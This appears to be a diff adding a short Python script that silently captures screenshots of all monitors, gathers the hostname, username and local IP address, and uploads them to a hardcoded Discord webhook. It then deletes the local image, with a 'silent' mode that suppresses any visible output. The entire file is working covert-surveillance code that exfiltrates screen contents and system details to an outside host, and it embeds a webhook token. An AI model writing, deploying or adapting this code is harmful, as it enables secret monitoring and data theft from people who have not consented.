@@ -1,0 +1,69 @@
+import os
+import socket
+import getpass
+from datetime import datetime
+import requests
+from PIL import ImageGrab
+
+# ================== SETTINGS ==================
+WEBHOOK_URL = "https://discord.com/api/webhooks/1465462568817656045/EYO39v1oLAH4zLoFHZzw6jYz8OEwqZnV44WeKUrKnX_8ZYSR5l7L949RFkj8MjbRaPkf"
+
+DEBUG = False        # True = prints info, False = silent
+LOG_ERRORS = True    # Write errors to a file when silent
+# ==============================================
+
+TEMP = os.environ["TEMP"]
+IMG_PATH = os.path.join(TEMP, "screenshot_all.png")
+LOG_PATH = os.path.join(TEMP, "script_error.log")
+
+
+def log(msg):
+    if DEBUG:
+        print(msg)
+
+
+def log_error(err):
+    if LOG_ERRORS:
+        with open(LOG_PATH, "a", encoding="utf-8") as f:
+            f.write(f"{datetime.now()} - {err}\n")
+
+
+try:
+    # === SCREENSHOT (ALL MONITORS) ===
+    img = ImageGrab.grab(all_screens=True)
+    img.save(IMG_PATH, "PNG")
+    log("Screenshot taken")
+
+    # === SYSTEM INFO ===
+    pc = socket.gethostname()
+    user = getpass.getuser()
+    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
+    # IPv4 (local)
+    ipv4 = socket.gethostbyname(socket.gethostname())
+
+    content = (
+        f"🖥️ PC: {pc}\n"
+        f"👤 User: {user}\n"
+        f"🌐 IPv4: {ipv4}\n"
+        f"⏰ Tijd: {time}"
+    )
+
+    # === SEND TO DISCORD ===
+    with open(IMG_PATH, "rb") as f:
+        r = requests.post(
+            WEBHOOK_URL,
+            files={"file": ("screenshot.png", f, "image/png")},
+            data={"content": content},
+            timeout=20
+        )
+
+    log(f"Webhook status: {r.status_code}")
+
+except Exception as e:
+    log_error(e)
+
+finally:
+    if os.path.exists(IMG_PATH):
+        os.remove(IMG_PATH)
+
